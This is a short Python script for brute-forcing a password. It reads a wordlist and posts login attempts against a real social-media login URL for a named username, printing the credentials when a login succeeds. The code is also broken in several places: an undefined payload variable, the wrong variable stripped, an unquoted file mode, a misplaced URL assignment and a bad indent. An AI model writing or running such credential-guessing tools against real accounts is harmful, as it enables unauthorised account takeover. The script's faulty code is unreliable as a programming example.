import requests
def bruteforce(username,url):
    for password in passwords:
        password = passwords.strip()
        print('[!! trying to bruteforce password ' + password)
        
        
        resp = requests.post(url,data_dictionary)
        if "Login failed" in resp.content:
            pass
        else:
            print("[+] username is: " + username)
            print("[+] pasword is: " + password)
            exit


        
        url = 'https://accounts.snapchat.com/accounts/login?client_id=geo'
username = 'ko50am'

with open('passwords.txt',r)as passwords:
bruteforce(username,url)
